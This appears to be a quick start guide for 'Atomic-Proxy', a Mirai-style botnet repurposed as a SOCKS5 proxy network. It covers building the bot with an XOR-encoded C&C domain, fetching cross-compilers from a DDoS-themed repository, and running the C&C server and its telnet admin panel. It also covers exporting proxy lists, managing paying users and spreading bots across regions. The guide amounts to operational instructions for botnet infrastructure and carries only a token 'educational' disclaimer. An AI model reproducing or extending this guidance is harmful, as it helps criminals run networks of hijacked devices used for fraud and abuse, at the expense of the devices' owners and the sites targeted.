# Atomic-Proxy Quick Start Guide

## Prerequisites

- Linux server (Ubuntu 20.04+ recommended)
- Root or sudo access
- Internet connection

## Installation (5 minutes)

### 1. Install Dependencies

```bash
# Update system
sudo apt-get update && sudo apt-get upgrade -y

# Install required packages
sudo apt-get install -y gcc g++ sqlite3 golang-1.20 git

# Verify Go installation
go version
```

### 2. Setup Cross-Compilers (Optional - for multi-arch support)

```bash
mkdir -p /etc/xcompile
cd /etc/xcompile

# Download cross-compilers (example for ARM)
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv7l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2

# Add to PATH
export PATH=$PATH:/etc/xcompile/armv7l/bin
```

### 3. Clone and Build

```bash
# Clone repository
cd ~
git clone <your-repo-url> atomic-proxy
cd atomic-proxy

# Configure C&C domain
cd tools
gcc xor.c -o xor
./xor string your-domain.com

# Copy output and add to bot/table.c
# Example: add_entry(TABLE_CNC_DOMAIN, "\xAB\xCD...", length);

# Build everything
cd ..
chmod +x build.sh
./build.sh
```

### 4. Initialize Database

```bash
# Create database
cd assets
sqlite3 data.db < init_proxy_db.sql

# Verify
sqlite3 data.db "SELECT * FROM users;"
```

### 5. Start C&C Server

```bash
cd ../cnc
go build
./cnc
```

You should see:
```
Welcome back! Atomic-Proxy Version V9.2
✓ Bot server started on port > [:1995]
✓ Master server started on port > [:666]
✓ API server started on port > [0.0.0.0:81]
```

## Basic Usage

### Admin Panel Access

```bash
# From another terminal
telnet localhost 666

# Login
username: root
password: root@123
```

### Start Proxy Network

```
proxy start port=1080 auth=false maxconns=50
```

### View Active Proxies

```
proxy list
```

### Check Statistics

```
proxy stats
```

### Export Proxy List

```
proxy export
```

## API Usage Examples

### Get Proxy List

```bash
curl "http://localhost:81/proxies?user=root&password=root@123"
```

### Start Proxies via API

```bash
curl "http://localhost:81/proxy/start?user=root&password=root@123&port=1080"
```

### Get Statistics

```bash
curl "http://localhost:81/proxy/stats?user=root&password=root@123"
```

### Export Proxy List (Text Format)

```bash
# IP:PORT format
curl "http://localhost:81/proxy/list?user=root&password=root@123&format=ip:port" > proxies.txt

# With auth format
curl "http://localhost:81/proxy/list?user=root&password=root@123&format=ip:port:user:pass" > proxies_auth.txt
```

## Testing Your First Proxy

### 1. Deploy a Bot Node (Testing)

```bash
# On the same machine (for testing)
cd release
chmod +x debug.dbg
./debug.dbg
```

### 2. Start Proxy

From admin panel:
```
proxy start port=1080
bots
proxy list
```

### 3. Test Connection

```bash
# Test with curl
curl -x socks5://127.0.0.1:1080 https://api.ipify.org

# Test with Python
python3 << EOF
import requests
proxies = {
    'http': 'socks5://127.0.0.1:1080',
    'https': 'socks5://127.0.0.1:1080'
}
r = requests.get('https://api.ipify.org', proxies=proxies)
print(f"IP through proxy: {r.text}")
EOF
```

## Common Commands Cheat Sheet

### Admin Panel

| Command | Description |
|---------|-------------|
| `help` | Show all commands |
| `methods` | Show proxy commands |
| `bots` | Show connected nodes |
| `proxy start` | Start proxy network |
| `proxy stop` | Stop all proxies |
| `proxy list` | List active proxies |
| `proxy stats` | Show statistics |
| `proxy export` | Export proxy list |
| `users` | List all users |
| `create <user> <pass> <days>` | Create new user |
| `clear` | Clear screen |

### API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/proxies` | GET | List all proxies |
| `/proxy/start` | POST | Start proxies |
| `/proxy/stop` | POST | Stop proxies |
| `/proxy/stats` | GET | Get statistics |
| `/proxy/list` | GET | Export proxy list |
| `/health` | GET | Health check |

## Troubleshooting

### Bot Not Connecting

**Problem:** Bot doesn't appear in `bots` command

**Solutions:**
1. Check if C&C server is running: `netstat -tlnp | grep 1995`
2. Verify domain configuration in bot/table.c
3. Check firewall: `sudo ufw allow 1995`
4. Look for errors in bot logs (if DEBUG enabled)

### Proxy Not Starting

**Problem:** `proxy start` shows 0 success

**Solutions:**
1. Verify bots are connected: `bots`
2. Check if port is available: `netstat -tlnp | grep 1080`
3. Try different port: `proxy start port=9050`
4. Check bot has permissions

### Cannot Connect Through Proxy

**Problem:** Connection timeout when using proxy

**Solutions:**
1. Verify proxy is running: `proxy list`
2. Check firewall on bot node
3. Test with telnet: `telnet <bot-ip> 1080`
4. Verify SOCKS5 client configuration

### API Returns 401

**Problem:** API authentication fails

**Solutions:**
1. Check credentials in database
2. Verify user has API access: `api true username`
3. Use correct URL encoding for special characters

## Security Checklist

- [ ] Change default admin password
- [ ] Enable firewall rules
- [ ] Use strong passwords for all users
- [ ] Enable TLS for API (production)
- [ ] Implement rate limiting
- [ ] Monitor logs regularly
- [ ] Keep system updated
- [ ] Backup database regularly

## Next Steps

1. **User Management**: Create additional users with different permission levels
2. **Geographic Setup**: Deploy bots in different regions for IP diversity
3. **Monitoring**: Set up log monitoring and alerts
4. **Scaling**: Deploy more bot nodes for larger proxy pool
5. **Automation**: Create scripts for automated proxy rotation

## Getting Help

- Check PROXY_GUIDE.md for detailed documentation
- Review logs in C&C server output
- Enable DEBUG mode in bot for detailed logging
- Check system logs: `journalctl -xe`

## Important Notes

⚠️ **Legal Warning**: Only deploy on systems you own or have permission to use.

⚠️ **Ethical Use**: This is for educational purposes only. Respect privacy and laws.

⚠️ **Security**: Never expose admin panel or API to public internet without proper security.

---

**For detailed documentation, see PROXY_GUIDE.md**
